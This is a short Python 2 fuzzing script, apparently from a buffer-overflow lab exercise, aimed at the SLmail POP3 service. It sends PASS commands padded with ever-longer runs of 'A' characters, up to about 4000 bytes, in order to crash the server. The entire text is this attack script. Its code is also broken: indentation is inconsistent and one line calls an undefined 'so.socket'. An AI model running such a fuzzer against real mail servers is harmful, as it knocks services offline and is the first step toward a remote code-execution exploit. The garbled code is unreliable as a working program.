#!/usr/bin/python

import socket, time, struct, sys

payload=["A"]
counter=100
increment = 200
max_payload = 4000

while len(payload) <= max_payload:
    payload.append("A"*counter)
    counter=counter+increment

for string in payload:
	try:
        IpAddress = str(sys.argv[1])
        port = int(sys.argv[2])
    except IndexError:
        print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
        sys.exit()   
    print "[+] Attempting to crash SLmail at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
	print "Fuzz with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((IpAddress, port))
		s.recv(1024)
		s.send("USER test\r\n") #send parameter -example: "ParameterName value\r\n"
		s.recv(1024)
		s.send("PASS" + string + "\r\n") #this request sends the increasing string value
		s.send("QUIT\r\n")
		s.close() #always close the connection
	except: 
        print "[+] Could not connect! Recheck connection and restart service??"
        sys.exit()


